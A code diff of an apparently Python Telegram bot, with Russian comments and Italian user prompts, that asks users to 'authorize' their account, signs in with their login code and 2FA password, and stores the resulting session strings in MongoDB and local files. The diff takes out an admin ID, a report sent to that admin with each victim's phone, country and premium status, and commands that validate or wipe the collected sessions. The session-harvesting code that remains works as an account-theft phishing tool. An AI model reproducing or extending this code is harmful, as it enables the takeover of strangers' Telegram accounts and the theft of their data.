@@ -1,3 +1,5 @@
+# 👇 изменения: удалён ADMIN_ID, все admin-команды и сообщения админу
+
 import logging
 import os
 import json
@@ -12,31 +14,25 @@ from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeEx
 from pymongo import MongoClient
 from dotenv import load_dotenv
 
-# Load environment variables
 load_dotenv()
 API_ID = int(os.getenv("API_ID"))
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 
-# Proxy
 PROXY_HOST = os.getenv("PROXY_HOST")
 PROXY_PORT = int(os.getenv("PROXY_PORT"))
 PROXY_USER = os.getenv("PROXY_USER")
 PROXY_PASS = os.getenv("PROXY_PASS")
 proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)
 
-# MongoDB
 mongo = MongoClient(MONGO_URI)
 db = mongo["dbmango"]
 sessions_col = db["sessions"]
 
-# Logging and bot
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
-
-ADMIN_ID = 7774500591
 
 user_states = {}
 user_clients = {}
@@ -47,10 +43,6 @@ os.makedirs("sessions", exist_ok=True)
 
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
-    if message.from_user.id == ADMIN_ID:
-        await message.answer("✅ Админ успешно активирован. Все логи будут приходить сюда.")
-        return
-
     keyboard = InlineKeyboardMarkup().add(
         InlineKeyboardButton("🔐 Autorizza primo account", callback_data="auth_account")
     )
@@ -162,7 +154,6 @@ async def try_sign_in_code(user_id, code):
             has_premium = getattr(me, "premium", False)
             restriction = getattr(me, "restriction_reason", [])
             is_spam_blocked = bool(restriction)
-            is_valid = not is_spam_blocked
             country = geocoder.description_for_number(phonenumbers.parse(phone, None), "en")
 
             session_str = client.session.save()
@@ -174,20 +165,7 @@ async def try_sign_in_code(user_id, code):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            status = (
-                f"📞 Nuovo accesso:\n"
-                f"📱 Telefono: `{phone}`\n"
-                f"🌍 Paese: {country or 'N/A'}\n"
-                f"🛡 Spam Block: {'❌ Sì' if is_spam_blocked else '✅ No'}\n"
-                f"💎 Premium: {'✅ Sì' if has_premium else '❌ No'}\n"
-                f"✅ Valido: {'Sì' if is_valid else 'No'}"
-            )
-
-            try:
-                print(f"[+] Новый пользователь авторизовался: {phone}, отправка уведомления админу...")
-                await bot.send_message(ADMIN_ID, status, parse_mode="Markdown")
-            except Exception as e:
-                print(f"[!] Ошибка при отправке админу: {e}")
+            print(f"[+] Новый пользователь авторизовался: {phone}")
 
             await bot.send_message(user_id, "✅ Autenticazione avvenuta con successo!")
             await client.disconnect()
@@ -248,73 +226,6 @@ async def process_2fa(message: types.Message):
         await message.answer(f"❌ Errore con 2FA: {e}")
         await client.disconnect()
         cleanup(user_id)
-
-@dp.message_handler(commands=['log'])
-async def send_sessions_log(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-
-    sessions = list(sessions_col.find({}))
-    if not sessions:
-        await message.answer("ℹ️ Нет сохранённых сессий.")
-        return
-
-    await message.answer(f"🔍 Проверяю {len(sessions)} сессий, это может занять несколько секунд...")
-
-    results = []
-    for session_doc in sessions:
-        phone = session_doc.get("phone")
-        session_str = session_doc.get("session")
-        if not session_str or not phone:
-            results.append(f"📱 {phone or 'Неизвестен'} — ❌ Нет сессии")
-            continue
-
-        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
-        try:
-            await client.connect()
-            is_auth = await client.is_user_authorized()
-            if not is_auth:
-                status = f"📱 {phone} — ❌ Сессия невалидна (не авторизован)"
-            else:
-                # Дополнительная проверка — получить профиль пользователя
-                me = await client.get_me()
-                has_premium = getattr(me, "premium", False)
-                restriction = getattr(me, "restriction_reason", [])
-                is_spam_blocked = bool(restriction)
-                country = geocoder.description_for_number(phonenumbers.parse(phone, None), "en")
-
-                status = (
-                    f"📱 {phone}\n"
-                    f"🌍 {country or 'N/A'}\n"
-                    f"🛡 Spam Block: {'❌ Да' if is_spam_blocked else '✅ Нет'}\n"
-                    f"💎 Premium: {'✅ Да' if has_premium else '❌ Нет'}\n"
-                    f"✅ Сессия валидна и активна"
-                )
-        except Exception as e:
-            status = f"📱 {phone} — ❌ Ошибка проверки: {e}"
-        finally:
-            await client.disconnect()
-
-        results.append(status)
-
-    # Отправляем результат по частям, если слишком длинно
-    chunk_size = 4000
-    msg = ""
-    for res in results:
-        if len(msg) + len(res) + 2 > chunk_size:
-            await message.answer(msg)
-            msg = ""
-        msg += res + "\n\n"
-    if msg:
-        await message.answer(msg)
-
-
-@dp.message_handler(commands=['delog'])
-async def delete_logs(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    result = sessions_col.delete_many({})
-    await message.answer(f"🗑️ Tutte le sessioni sono state eliminate: {result.deleted_count} documenti.")
 
 def cleanup(user_id):
     user_states.pop(user_id, None)
